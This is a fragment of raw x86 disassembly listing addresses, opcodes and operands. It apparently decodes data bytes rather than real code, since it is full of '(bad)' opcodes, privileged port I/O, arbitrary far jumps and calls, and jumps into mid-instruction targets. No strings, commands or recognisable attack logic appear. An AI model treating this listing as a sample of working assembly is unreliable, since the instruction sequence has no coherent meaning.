  4179c8:	outs   dx,BYTE PTR ds:[esi]
  4179c9:	and    bh,BYTE PTR ds:0xfdfd975e
  4179cf:	(bad)  
  4179d0:	fdiv   DWORD PTR [ebx+0x44ed393b]
  4179d6:	in     al,0xa4
  4179d8:	pop    ebp
  4179d9:	xchg   esp,eax
  4179da:	adc    al,BYTE PTR [eax-0x43]
  4179dd:	nop
  4179de:	jno    0x417a4a
  4179e0:	imul   eax,ebp,0x4
  4179e3:	inc    ebp
  4179e4:	push   eax
  4179e5:	js     0x417997
  4179e7:	jle    0x4179e6
  4179e9:	mov    ebp,0x81f602dc
  4179ee:	in     eax,dx
  4179ef:	fdivr  QWORD PTR [ebp-0x60bf4f13]
  4179f5:	ficom  WORD PTR [ecx]
  4179f7:	mov    ds:0x2d53373a,eax
  4179fc:	ret    
  4179fd:	std    
  4179fe:	idiv   BYTE PTR [eax]
  417a00:	in     al,dx
  417a01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a02:	das    
  417a03:	xor    ebp,esi
  417a05:	stc    
  417a06:	inc    esi
  417a07:	retf   
  417a08:	call   0xae5e:0x7fa4ea82
  417a0f:	sbb    cl,BYTE PTR [edi-0x57]
  417a12:	mov    al,0x9
  417a14:	inc    esp
  417a15:	pusha  
  417a16:	in     eax,dx
  417a17:	and    eax,0x9a5cacc8
  417a1c:	sti    
  417a1d:	out    0x74,eax
  417a1f:	jns    0x417a37
  417a21:	pop    ds
  417a22:	mov    esi,?
  417a24:	ins    DWORD PTR es:[edi],dx
  417a25:	sub    esi,DWORD PTR [ebx+0x6ad20469]
  417a2b:	fistp  DWORD PTR [edi]
  417a2d:	int    0xd2
  417a2f:	jno    0x417a03
  417a31:	lahf   
  417a32:	xchg   esp,eax
  417a33:	push   cs
  417a34:	(bad)  
  417a36:	xchg   cl,bh
  417a38:	(bad)  
  417a39:	fdivr  st(1),st
  417a3b:	daa    
  417a3c:	jo     0x417a7a
  417a3e:	sbb    eax,0xf5fa9dfe
  417a43:	adc    BYTE PTR [ecx+0x47],cl
  417a46:	jg     0x417aae
  417a48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a49:	ror    BYTE PTR [ecx-0x1c41b1b4],cl
  417a4f:	sbb    dh,BYTE PTR [edi+0x45a6491e]
  417a55:	xor    DWORD PTR [edx],ecx
  417a57:	or     BYTE PTR [ecx],bh
  417a59:	add    DWORD PTR [ebx+0x10843561],edx
  417a5f:	mov    edi,0xcc1b3b6d
  417a64:	cmp    DWORD PTR [esi],ebp
  417a66:	lahf   
  417a67:	jae    0x417a94
  417a69:	int3   
  417a6a:	and    cl,al
  417a6c:	retf   
  417a6d:	dec    eax
  417a6e:	in     al,0xf8
  417a70:	sub    eax,0x87358ac8
  417a75:	mov    WORD PTR [ebx+ebp*4-0x4d],es
  417a79:	mov    ecx,0xe1527ee6
  417a7e:	xor    esi,DWORD PTR [eax+0x5d5ae013]
  417a84:	sub    BYTE PTR [eax-0x73],al
  417a87:	jno    0x417a18
  417a89:	retf   
  417a8a:	jge    0x417afc
  417a8c:	test   BYTE PTR [edi],bl
  417a8e:	pop    edi
  417a8f:	pop    edx
  417a90:	push   cs
  417a91:	mov    esp,0xba9b0aa5
  417a96:	add    DWORD PTR [eax-0x775b5105],ecx
  417a9c:	xor    BYTE PTR [edi-0x5c],ah
  417a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa0:	outs   dx,DWORD PTR ds:[esi]
  417aa1:	and    edi,ecx
  417aa3:	dec    edx
  417aa4:	int3   
  417aa5:	xor    edx,DWORD PTR [ebp+0xc6c8421]
  417aab:	dec    edx
  417aac:	cmp    BYTE PTR [ebx-0x7b107a31],bl
  417ab2:	mov    ds,edx
  417ab4:	addr16 pop ds
  417ab6:	ja     0x417b35
  417ab8:	inc    BYTE PTR [ebx-0x7b21c595]
  417abe:	mov    ds:0xd2c7a1c7,al
  417ac3:	sbb    bl,ch
  417ac5:	mov    ecx,0xb441116d
  417aca:	daa    
  417acb:	xor    eax,DWORD PTR [ebx-0x45a58f27]
  417ad1:	je     0x417ac8
  417ad3:	std    
  417ad4:	xor    BYTE PTR [eax-0x15],dh
  417ad7:	daa    
  417ad8:	or     esp,eax
  417ada:	call   0x2f402f39
  417adf:	gs xchg ecx,eax
  417ae1:	je     0x417b37
  417ae3:	aam    0xd8
  417ae5:	pop    edi
  417ae6:	xchg   edi,eax
  417ae7:	adc    DWORD PTR [edx],0x49972105
  417aed:	ret    
  417aee:	jmp    0x417b5d
  417af0:	mov    ds:0x96d2c9e7,al
  417af5:	and    ebp,DWORD PTR [ebx]
  417af7:	aaa    
  417af8:	and    edx,edi
  417afa:	loop   0x417adc
  417afc:	in     eax,dx
  417afd:	dec    esp
  417afe:	xchg   ecx,eax
  417aff:	mov    eax,0xe46349c9
  417b04:	out    0x10,al
  417b06:	clc    
  417b07:	pop    ss
  417b08:	hlt    
  417b09:	fisttp QWORD PTR [eax+0x909b5d4]
  417b0f:	ins    DWORD PTR es:[edi],dx
  417b10:	shl    BYTE PTR [ecx-0x20],0x66
  417b14:	xchg   bh,ah
  417b16:	fmul   DWORD PTR [edi+0x5f]
  417b19:	pop    ecx
  417b1a:	repnz push eax
  417b1c:	cdq    
  417b1d:	cmp    cl,BYTE PTR [esi-0x44949785]
  417b23:	push   es
  417b24:	xchg   edi,eax
  417b25:	lea    ebx,[esi]
  417b27:	cwde   
  417b28:	js     0x417b01
  417b2a:	xchg   ecx,eax
  417b2b:	inc    esi
  417b2c:	cmp    eax,0x5bf40a8e
  417b31:	ins    DWORD PTR es:[edi],dx
  417b32:	or     bl,BYTE PTR [esi-0x21]
  417b35:	fcmovb st,st(6)
  417b37:	push   ss
  417b38:	cmp    DWORD PTR ds:[esi+0x742bf6f2],eax
  417b3f:	jmp    0xdafa:0xf6ee43b0
  417b46:	in     al,0xe8
  417b48:	leave  
  417b49:	imul   ebx,DWORD PTR [esi-0x1cfb148a],0xffffffb8
  417b50:	lods   al,BYTE PTR ds:[esi]
  417b51:	bnd jo 0x417ae6
  417b54:	addr16 dec edx
  417b56:	push   ebp
  417b57:	ins    DWORD PTR es:[edi],dx
  417b58:	pushf  
  417b59:	aas    
  417b5a:	mov    dh,0x24
  417b5c:	or     eax,eax
  417b5e:	ret    0xd2d2
  417b61:	mov    bl,0x34
  417b63:	cmp    al,0xd9
  417b65:	pop    ss
  417b66:	mov    esi,0xcafa37e8
  417b6b:	(bad)  
  417b6c:	(bad)  
  417b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b6e:	cli    
  417b6f:	aaa    
  417b70:	pushf  
  417b71:	pop    eax
  417b72:	retf   0xd187
  417b75:	outs   dx,DWORD PTR ds:[esi]
  417b76:	sbb    eax,0x68a9a368
  417b7b:	mov    cl,0xd7
  417b7d:	repnz (bad) 
  417b7f:	mov    ch,0xec
  417b81:	jne    0x417b5a
  417b83:	ds mov edx,0x49218cfc
  417b89:	icebp  
  417b8a:	test   al,0xed
  417b8c:	sub    al,BYTE PTR ds:0xbf2291c7
  417b92:	icebp  
  417b93:	mov    ebx,DWORD PTR [ebx]
  417b95:	fisttp DWORD PTR [esi]
  417b97:	push   es
  417b98:	dec    eax
  417b99:	pushf  
  417b9a:	jg     0x417b53
  417b9c:	aam    0x3d
  417b9e:	xchg   ecx,eax
  417b9f:	xchg   edx,eax
  417ba0:	arpl   WORD PTR [edx+0x40980db1],bx
  417ba6:	and    cl,BYTE PTR [ecx]
  417ba8:	xchg   esp,eax
  417ba9:	mov    eax,ds:0xaf08de55
  417baf:	jns    0x417c04
  417bb1:	repnz retf 
  417bb3:	dec    ecx
  417bb4:	scas   eax,DWORD PTR es:[edi]
  417bb5:	pop    edx
  417bb6:	jecxz  0x417c2a
  417bb8:	adc    cl,BYTE PTR [eax+0x55]
  417bbb:	pop    ebp
  417bbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bbd:	and    eax,0xaf10b6d4
  417bc2:	dec    edi
  417bc3:	stos   DWORD PTR es:[edi],eax
  417bc4:	sub    BYTE PTR [ebp-0x44],bh
  417bc7:	xchg   BYTE PTR [edx-0x2a],dh
  417bca:	inc    edx
  417bcb:	(bad)  
  417bcc:	retf   0xff02
  417bcf:	jbe    0x417c3c
  417bd1:	popf   
  417bd2:	fs xchg ecx,eax
  417bd4:	iret   
  417bd5:	jo     0x417bcc
  417bd7:	push   eax
  417bd8:	fst    QWORD PTR [edi]
  417bda:	nop
  417bdb:	test   dh,ch
  417bdd:	pop    es
  417bde:	repz (bad) 
  417be1:	ret    0x23e4
  417be4:	cli    
  417be5:	rol    esp,cl
  417be7:	es adc eax,0xdb34ada8
  417bed:	(bad)
  417bf0:	cmp    DWORD PTR [esi-0x1223987e],ebx
  417bf6:	mov    cl,0x72
  417bf8:	mov    bh,0xf2
  417bfa:	repnz rep lods al,BYTE PTR ds:[esi]
  417bfd:	mov    DWORD PTR [ecx+0x40],ecx
  417c00:	dec    ecx
  417c01:	(bad)  
  417c02:	in     al,dx
  417c03:	loope  0x417c72
  417c05:	lahf   
  417c06:	rcr    DWORD PTR [ebx+0x6],0x2
  417c0a:	cdq    
  417c0b:	jae    0x417c46
  417c0d:	mov    esi,0xaca9045
  417c12:	mov    eax,ds:0x3db9bd0e
  417c17:	std    
  417c18:	lods   eax,DWORD PTR ds:[esi]
  417c19:	stos   BYTE PTR es:[edi],al
  417c1a:	and    BYTE PTR [esi-0x3d],dl
  417c1d:	into   
  417c1e:	ds jae 0x417bc2
  417c21:	(bad)  
  417c22:	fcomp  QWORD PTR [edi]
  417c24:	dec    ecx
  417c25:	push   es
  417c26:	aaa    
  417c27:	xchg   BYTE PTR [eax-0x2ac5b4d0],al
  417c2d:	inc    esp
  417c2e:	cli    
  417c2f:	nop
  417c30:	pop    esp
  417c31:	fs cmp eax,0xc5041686
  417c37:	xor    esi,DWORD PTR [edi+0x59]
  417c3a:	mov    edi,0x6531be15
  417c3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c40:	mov    dl,0x4f
  417c42:	js     0x417c13
  417c44:	in     al,0xbf
  417c46:	lahf   
  417c47:	jae    0x417c17
  417c49:	fld    TBYTE PTR ds:0x7efc1873
  417c4f:	lock mov al,ds:0xae70b6fb
  417c55:	add    DWORD PTR [ebx],ebp
  417c57:	add    ch,BYTE PTR [esi]
  417c59:	and    BYTE PTR [ebx],dh
  417c5b:	test   eax,0x8b4fd427
  417c60:	xlat   BYTE PTR ds:[ebx]
  417c61:	fist   DWORD PTR [edx+0x7e]
  417c64:	mov    ch,0x2
  417c66:	jmp    0x417cb9
  417c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c69:	jns    0x417cbd
  417c6b:	call   0xf4232373
  417c70:	mov    ebp,0x7e703034
  417c75:	jne    0x417c65
  417c77:	dec    edi
  417c78:	and    DWORD PTR [ecx-0x19d59167],ebx
  417c7e:	mov    dl,0x25
  417c80:	adc    al,bl
  417c82:	inc    ebx
  417c83:	(bad)  
  417c84:	push   esp
  417c85:	(bad)  
  417c86:	jle    0x417cb6
  417c88:	sub    eax,0x7518a4b0
  417c8d:	xor    BYTE PTR [ebx+eax*4+0x4e],bh
  417c91:	repz push 0xffffff9f
  417c94:	mov    ah,0xdf
  417c96:	sub    ebx,DWORD PTR [ecx+0x4452a17d]
  417c9c:	pop    ebx
  417c9d:	icebp  
  417c9e:	add    ebp,ebx
  417ca0:	repnz pop esp
  417ca2:	jbe    0x417d19
  417ca4:	int    0x86
  417ca6:	pushf  
  417ca7:	dec    edi
  417ca8:	add    ecx,DWORD PTR [ebx+edx*4+0x46]
  417cac:	sahf   
  417cad:	inc    edx
  417cae:	icebp  
  417caf:	sub    ebx,DWORD PTR [edx]
  417cb1:	xor    eax,0x6683f0f1
  417cb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cb7:	data16 or BYTE PTR ds:0x60694430,ch
  417cbe:	sbb    BYTE PTR [eax-0x5c],dh
  417cc1:	or     eax,0x768fe6a8
  417cc6:	adc    esp,edx
  417cc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cc9:	das    
  417cca:	gs mov esp,0x9d94d4b4
  417cd0:	scas   al,BYTE PTR es:[edi]
  417cd1:	cli    
  417cd2:	add    esp,esp
  417cd4:	icebp  
  417cd5:	add    ch,BYTE PTR [eax+0x5d927a08]
  417cdb:	dec    edx
  417cdc:	(bad)  
  417cdd:	int    0x56
  417cdf:	loop   0x417c95
  417ce1:	fcom   QWORD PTR [ebx-0x64e3d159]
  417ce7:	dec    ebx
  417ce8:	repz fist WORD PTR [eax-0x28b23088]
  417cef:	add    dl,al
  417cf1:	mov    esp,fs
  417cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cf4:	and    al,0xc4
  417cf6:	mov    ds:0xef3ad7fe,al
  417cfb:	adc    edx,ebp
  417cfd:	mov    ah,BYTE PTR [esi]
  417cff:	dec    ebx
  417d00:	icebp  
  417d01:	fnstcw WORD PTR [edi+0x10]
  417d04:	mov    ch,0x59
  417d06:	add    eax,0xfa9b7ae5
  417d0b:	or     al,0x1d
  417d0d:	push   edx
  417d0e:	push   0xee2bf5f9
  417d13:	test   eax,0x925b9e82
  417d18:	inc    esi
  417d19:	out    dx,eax
  417d1a:	xor    eax,DWORD PTR [ebx+0x16]
  417d1d:	jne    0x417d27
  417d1f:	mov    cl,0x79
  417d21:	cld    
  417d22:	add    DWORD PTR [ebp+0x6d],ebp
  417d25:	repnz add eax,0xba2bd2d8
  417d2b:	jecxz  0x417cfa
  417d2d:	mov    ebp,0x53213eba
  417d32:	ret    
  417d33:	(bad)  
  417d34:	ins    BYTE PTR es:[edi],dx
  417d35:	cmp    dh,BYTE PTR [esi]
  417d37:	sbb    edi,DWORD PTR [edi-0x408694af]
  417d3d:	sub    dh,BYTE PTR [eax+0x1532f0f2]
  417d43:	out    0xa0,al
  417d45:	inc    edi
  417d46:	adc    BYTE PTR [edx-0xe],bl
  417d49:	pusha  
  417d4a:	jp     0x417cf7
  417d4c:	(bad)  
  417d4d:	jle    0x417d98
  417d4f:	dec    ecx
  417d50:	lds    edx,FWORD PTR [edi-0xd3ac64d]
  417d56:	add    eax,0x7631768a
  417d5b:	push   es
  417d5c:	cmp    DWORD PTR [ebp+0x38],0xc4da3870
  417d63:	pop    edx
  417d64:	push   edi
  417d65:	or     eax,0x5cdc2dd2
  417d6a:	dec    eax
  417d6b:	and    ch,BYTE PTR [ecx-0x78]
  417d6e:	sub    al,0xd2
  417d70:	xchg   esi,eax
  417d71:	hlt    
  417d72:	in     eax,0x84
  417d74:	test   al,0xf9
  417d76:	xor    edi,DWORD PTR [ebp-0x6dc333f5]
  417d7c:	iret   
  417d7d:	pop    DWORD PTR [eax+0x76]
  417d80:	aaa    
  417d81:	fucom  st(6)
  417d83:	lahf   
  417d84:	lahf   
  417d85:	sbb    eax,0x72d17820
  417d8a:	aaa    
  417d8b:	push   es
  417d8c:	std    
  417d8d:	xlat   BYTE PTR ds:[ebx]
  417d8e:	dec    edx
  417d8f:	push   ebp
  417d90:	in     eax,0xc8
  417d92:	add    edx,0xdca53e79
  417d98:	jecxz  0x417df5
  417d9a:	dec    ebp
  417d9b:	repnz and DWORD PTR [esi-0x44],edi
  417d9f:	mov    bl,BYTE PTR [esi]
  417da1:	cmp    BYTE PTR [ebx-0x7],al
  417da4:	hlt    
  417da5:	pop    ebp
  417da6:	test   eax,0xebb82a76
  417dab:	imul   dh
  417dad:	(bad)  
  417daf:	aas    
  417db0:	mov    al,ds:0x880f19c6
  417db5:	or     edx,DWORD PTR ds:0x8ff81d51
  417dbb:	sub    esp,DWORD PTR [eax+0x74d63a7b]
  417dc1:	adc    eax,0xccb7de20
  417dc6:	shr    BYTE PTR [ecx],1
  417dc8:	cwde   
  417dc9:	inc    esp
  417dca:	cdq    
  417dcb:	dec    ebx
  417dcc:	ds xchg ebx,edi
  417dcf:	adc    eax,0xe44bae29
  417dd4:	rol    BYTE PTR [bx+si],0xcb
  417dd8:	call   0x900f:0xa92b6c12
  417ddf:	push   eax
  417de0:	ins    DWORD PTR es:[edi],dx
  417de1:	arpl   sp,si
  417de3:	jle    0x417e46
  417de5:	mov    ds:0xf33ae113,eax
  417dea:	pop    ebp
  417deb:	push   ds
  417dec:	fs jns 0x417ddf
  417def:	retf   0xfdb
  417df2:	pop    edi
  417df3:	xchg   edi,eax
  417df4:	retf   
  417df5:	test   ah,dh
  417df7:	xor    BYTE PTR [edx+0x5e4ba8ea],dl
  417dfd:	cwde   
  417dfe:	jmp    FWORD PTR [ebp+0x40ad73ff]
  417e04:	int    0x3c
  417e06:	lahf   
  417e07:	sub    al,0xe0
  417e09:	or     ebx,0x28
  417e0c:	cmc    
  417e0d:	daa    
  417e0e:	sub    BYTE PTR [ebx+edi*2+0x2374c0a6],bh
  417e15:	repnz iret 
  417e17:	ja     0x417da5
  417e19:	mov    cl,0x74
  417e1b:	inc    edi
  417e1c:	jmp    0x2f0f:0x7a940c4e
  417e23:	mov    bh,0x5c
  417e25:	xor    al,0x33
  417e27:	mov    ds:0x64756a99,al
  417e2c:	out    0xa9,eax
  417e2e:	xchg   BYTE PTR [edi*4+0x69199d35],bl
  417e35:	ror    BYTE PTR [esi],cl
  417e37:	mov    esi,0x6af9a446
  417e3c:	pop    edx
  417e3d:	xchg   BYTE PTR [esi-0x5fb92a3c],dl
  417e43:	push   ss
  417e44:	iret   
  417e45:	or     ecx,DWORD PTR [eax]
  417e47:	mov    dl,BYTE PTR ds:0x18cb372e
  417e4d:	test   al,0xd7
  417e4f:	sar    DWORD PTR [ebx],0x19
  417e52:	push   ebx
  417e53:	(bad)  
  417e54:	ficomp DWORD PTR [edx+0x11]
  417e57:	or     eax,0x5346e8e5
  417e5c:	push   cs
  417e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e5e:	mov    bl,0x7
  417e60:	or     bh,ah
  417e62:	test   eax,0x8e047cec
  417e67:	in     al,0x10
  417e69:	pushf  
  417e6a:	push   ebx
  417e6b:	loop   0x417eea
  417e6d:	pop    esi
  417e6e:	push   ds
  417e6f:	push   ebp
  417e70:	jp     0x417ecd
  417e72:	inc    eax
  417e73:	blcmsk ebp,DWORD PTR [ecx+0xe1d9dc9]
  417e7c:	add    al,0xea
  417e7e:	push   0x98da3d04
  417e83:	sub    cl,cl
  417e85:	test   eax,0xdb9715e5
  417e8a:	jb     0x417e4d
  417e8c:	xchg   ecx,eax
  417e8d:	out    0x58,al
  417e8f:	push   eax
  417e90:	sub    al,0x84
  417e92:	jle    0x417e2b
  417e94:	test   eax,0xb0fca262
  417e99:	icebp  
  417e9a:	push   es
  417e9b:	jmp    0x417e36
  417e9d:	mov    ch,BYTE PTR [ecx+ecx*4-0x2c]
  417ea1:	pop    es
  417ea2:	pop    ebx
  417ea3:	xlat   BYTE PTR ds:[ebx]
  417ea4:	or     al,BYTE PTR [edi]
  417ea6:	loop   0x417ea2
  417ea8:	call   0xf1cf:0x110b51c6
  417eaf:	mov    esp,esi
  417eb1:	std    
  417eb2:	cmp    dl,BYTE PTR ds:0xf3948fa1
  417eb8:	lahf   
  417eb9:	repz and edi,ebx
  417ebc:	lock mov ebx,0x286f4732
  417ec2:	jae    0x417eff
  417ec4:	adc    ah,BYTE PTR [eax+0x54ad73c1]
  417eca:	push   edx
  417ecb:	ins    DWORD PTR es:[edi],dx
  417ecc:	mov    ecx,0xd74a0564
  417ed1:	add    eax,0xbd59c9e
  417ed6:	mov    esp,0x22571639
  417edb:	lds    esp,FWORD PTR [ebp+0x40]
  417ede:	in     al,0x61
  417ee0:	sbb    edi,DWORD PTR [esi+0x76]
  417ee3:	addr16 test al,0xb4
  417ee6:	and    eax,DWORD PTR [edi+0x7]
  417ee9:	les    esp,FWORD PTR [eax-0x36]
  417eec:	ss adc al,0xe3
  417eef:	pop    ebx
  417ef0:	call   0xead95155
  417ef5:	lods   al,BYTE PTR ds:[esi]
  417ef6:	retf   0xcf2f
  417ef9:	mov    ebp,0xc9b57c65
  417efe:	lock outs dx,DWORD PTR ds:[esi]
  417f00:	iret   
  417f01:	add    bh,BYTE PTR [ebx-0x7f]
  417f04:	aaa    
  417f05:	add    al,0xb4
  417f07:	into   
  417f08:	xlat   BYTE PTR ds:[ebx]
  417f09:	sub    DWORD PTR [esi*8+0x6109f152],esp
  417f10:	mov    al,BYTE PTR [ecx+0x54bfd181]
  417f16:	push   cs
  417f17:	stc    
  417f18:	inc    ebx
  417f19:	dec    eax
  417f1a:	(bad)  
  417f1b:	std    
  417f1c:	sbb    cl,0xc1
  417f1f:	stos   DWORD PTR es:[edi],eax
  417f20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f21:	jg     0x417edb
  417f23:	sub    al,0xe8
  417f25:	les    edx,FWORD PTR [ecx-0x201dc0b9]
  417f2b:	push   cs
  417f2c:	and    al,0x94
  417f2e:	mov    al,ds:0xed50ac01
  417f33:	cmc    
  417f34:	jp     0x417f52
  417f36:	pop    ecx
  417f37:	lds    eax,FWORD PTR [ebx+0x65933814]
  417f3d:	jle    0x417f17
  417f3f:	sbb    edi,esp
  417f41:	inc    ebx
  417f42:	mov    DWORD PTR [esi],esp
  417f44:	into   
  417f45:	sub    eax,0x4c3593a5
  417f4a:	cmovs  ebx,DWORD PTR [eax+0x4120339]
  417f51:	je     0x417f64
  417f53:	in     al,0xae
  417f55:	in     eax,dx
  417f56:	dec    ecx
  417f57:	and    BYTE PTR [esi-0x765a9187],dl
  417f5d:	cdq    
  417f5e:	cmp    eax,0x375b7c77
  417f63:	cmp    al,0xcd
  417f65:	jmp    0x819f:0xdd48dce2
  417f6c:	jb     0x417f14
  417f6e:	lds    ebp,FWORD PTR [eax]
  417f70:	inc    eax
  417f71:	push   es
  417f72:	call   0xc6591335
  417f77:	xchg   edx,eax
  417f78:	and    ah,BYTE PTR [esi-0x2d16bb0e]
  417f7e:	rcr    edx,1
  417f80:	stc    
  417f81:	imul   esp,eax,0x43
  417f84:	inc    esp
  417f85:	loop   0x417fc6
  417f87:	jmp    0x417f18
  417f89:	inc    eax
  417f8a:	add    eax,0xe8bd13be
  417f8f:	fwait
  417f90:	ret    0xc5df
  417f93:	fstp   TBYTE PTR [edi+ebx*2]
  417f96:	inc    DWORD PTR [eax]
  417f98:	mov    BYTE PTR [edx+0xe],ah
  417f9b:	mov    ch,0x69
  417f9d:	sub    eax,0x93ab412b
  417fa2:	xor    eax,0x11e1dab0
  417fa7:	sbb    cl,BYTE PTR [esi+0x7a]
  417faa:	sti    
  417fab:	and    eax,0xc2a58994
  417fb0:	mov    ecx,0x48f7b730
  417fb5:	cmp    eax,0x2a295e76
  417fba:	ffreep st(1)
  417fbc:	in     eax,dx
  417fbd:	repnz pop ecx
  417fbf:	in     eax,dx
  417fc0:	dec    ecx
  417fc1:	jecxz  0x417f77
  417fc3:	mov    ebp,esp
  417fc5:	scas   eax,DWORD PTR es:[edi]
  417fc6:	gs (bad) 
  417fc9:	inc    eax
  417fca:	mov    ch,BYTE PTR [ecx+ecx*8-0x7e1c04c9]
  417fd1:	nop
  417fd2:	mov    ds:0xbee28d37,al
  417fd7:	sahf   
  417fd8:	xor    DWORD PTR ds:0x13646054,ebp
  417fde:	xchg   BYTE PTR [ecx+0x54],dh
  417fe1:	cmp    ecx,eax
  417fe3:	stc    
  417fe4:	ins    BYTE PTR es:[edi],dx
  417fe5:	mov    edi,0xb4835b4c
  417fea:	fdivr  st(0),st
  417fec:	push   ebp
  417fed:	sbb    bh,BYTE PTR [esi+0x6f89f468]
  417ff3:	call   0x4b04:0xc9b6866c
  417ffa:	inc    esp
  417ffb:	push   ecx
  417ffc:	inc    edx
  417ffd:	and    dh,0x29
  418000:	add    al,0x9
  418002:	js     0x417fb4
  418004:	adc    al,BYTE PTR [edx]
  418006:	or     BYTE PTR [ebx-0x7bf04988],ah
  41800c:	out    dx,eax
  41800d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41800f:	int3   
  418010:	mov    ecx,0xcbc155dc
  418015:	push   edi
  418016:	imul   edx,DWORD PTR [esi+0x75d92202],0x1d
  41801d:	xchg   edx,eax
  41801e:	cdq    
  41801f:	and    eax,0xb97c4065
  418024:	nop
  418025:	ins    BYTE PTR es:[edi],dx
  418026:	dec    ebx
  418027:	jmp    0x418073
  418029:	hlt    
  41802a:	test   BYTE PTR [edx+esi*2],dl
  41802d:	and    DWORD PTR [ebp+edx*8-0x50],ebx
  418031:	rcr    BYTE PTR [ebp-0x34],1
  418034:	pop    edi
  418035:	jne    0x417fe1
  418037:	and    eax,0x13dfaf51
  41803c:	enter  0xfa57,0xe2
  418040:	std    
  418041:	xchg   edi,eax
  418042:	add    ah,al
  418044:	int    0xe9
  418046:	mov    BYTE PTR [esi+0x71],ah
  418049:	sbb    edi,ebp
  41804b:	dec    esp
  41804c:	jmp    0xf4560a93
  418051:	ja     0x418017
  418053:	fucomip st,st(1)
  418055:	jae    0x41800d
  418057:	mov    ecx,0x199470c6
  41805c:	aad    0x32
  41805e:	mov    ecx,0xb346e1d3
  418063:	mov    ebp,0x8f8bd17e
  418068:	xor    al,0x60
  41806a:	jns    0x41804f
  41806c:	mov    esp,0xfdb3b33c
  418071:	jbe    0x4180e6
  418073:	fdivr  DWORD PTR [eax+0x1c]
  418076:	fidivr WORD PTR [edi-0x39]
  418079:	adc    eax,0x211bca80
  41807e:	arpl   WORD PTR [edx],sp
  418080:	sub    cl,BYTE PTR [edi+0x23d73a22]
  418086:	lea    ebx,[ecx+esi*1-0x2ceab5a9]
  41808d:	sub    DWORD PTR [eax],esp
  41808f:	gs push ebx
  418091:	js     0x4180b9
  418093:	leave  
  418094:	push   ss
  418095:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418096:	out    0x51,al
  418098:	xchg   esp,eax
  418099:	ja     0x418090
  41809b:	call   0x3409:0x4fb017bc
  4180a2:	retf   
  4180a3:	or     DWORD PTR [ecx+0x536aede2],esi
  4180a9:	aas    
  4180aa:	push   ebp
  4180ab:	mov    ecx,0x961540ef
  4180b0:	repz mov edi,0xe74c7924
  4180b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180b7:	stc    
  4180b8:	or     DWORD PTR [ebp+0x45],edx
  4180bb:	sbb    ah,BYTE PTR [ecx-0x7b]
  4180be:	arpl   WORD PTR [eax],sp
  4180c0:	cmp    BYTE PTR [edx],0x23
  4180c3:	js     0x4180ae
  4180c5:	fnstenv [ecx-0xa]
  4180c8:	and    edx,DWORD PTR [esi+0x22]
  4180cb:	fistp  QWORD PTR [esi-0x50]
  4180ce:	jne    0x4180bb
  4180d0:	std    
  4180d1:	pop    eax
  4180d2:	fs xchg ebx,eax
  4180d4:	jbe    0x4180df
  4180d6:	and    ch,BYTE PTR [ebx]
  4180d8:	cmp    ch,BYTE PTR [ebx-0x5d]
  4180db:	push   0xffffffc2
  4180dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180de:	retf   
  4180df:	call   0x648ca650
  4180e4:	lock pop esp
  4180e6:	loope  0x4180ee
  4180e8:	mov    eax,ds:0xc33932c
  4180ed:	dec    eax
  4180ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180ef:	sbb    edx,eax
  4180f1:	and    eax,0x83924825
  4180f6:	out    dx,eax
  4180f7:	aaa    
  4180f8:	(bad)  
  4180f9:	lock jb 0x41812b
  4180fc:	push   cs
  4180fd:	jnp    0x4180c3
  4180ff:	cli    
  418100:	inc    ebp
  418101:	cmp    al,0x3d
  418103:	bound  edi,QWORD PTR [eax-0x4755b55]
  418109:	mov    al,0x66
  41810b:	es aaa 
  41810d:	mov    dl,0x54
  41810f:	jge    0x4180e5
  418111:	pop    ds
  418112:	out    0xa7,eax
  418114:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418115:	jg     0x418162
  418117:	xor    al,0x2
  418119:	mov    WORD PTR [eax+0x61877170],cs
  41811f:	push   ecx
  418120:	push   0x47
  418122:	in     al,dx
  418123:	sti    
  418124:	jg     0x4180c1
  418126:	jmp    0x4180d9
  418128:	(bad)  
  418129:	fidivr WORD PTR [ebx+ebp*1-0x7f]
  41812d:	jecxz  0x418139
  41812f:	lahf   
  418130:	call   DWORD PTR [ebx-0x22]
  418133:	jmp    DWORD PTR [ecx+0x63]
  418136:	aad    0xda
  418138:	cmp    eax,0x8559ca2f
  41813d:	js     0x418146
  41813f:	out    0x3c,eax
  418141:	ret    0x562d
  418144:	sub    BYTE PTR [esi-0xf],0x41
  418148:	and    esi,esi
  41814a:	(bad)  
  41814c:	cmc    
  41814d:	sti    
  41814e:	imul   ebx,DWORD PTR [ecx+0x69],0xfe217c1e
  418155:	ja     0x4181c3
  418157:	fcom   DWORD PTR [edi+0x15347ab9]
  41815d:	stc    
  41815e:	pop    ebp
  41815f:	xor    al,0x52
  418161:	arpl   WORD PTR [esi],dx
  418163:	inc    ebp
  418164:	jbe    0x4181a1
  418166:	out    0x31,al
  418168:	(bad)  
  418169:	jnp    0x418117
  41816b:	(bad)  
  41816d:	test   edx,ebp
  41816f:	and    dl,BYTE PTR [edx+0x1cca860e]
  418175:	mov    dh,BYTE PTR [esi+eiz*8-0x3a]
  418179:	dec    esp
  41817a:	push   0xf9462aba
  41817f:	xor    eax,0xbdecfcbb
  418184:	add    eax,0xfd35a91a
  41818a:	pop    eax
  41818b:	and    DWORD PTR [ebx],0x5f
  41818e:	and    dl,al
  418190:	(bad)  
  418191:	in     al,0xc0
  418193:	das    
  418194:	cmp    al,0x5f
  418196:	int3   
  418197:	fmul   QWORD PTR [esp+eiz*8]
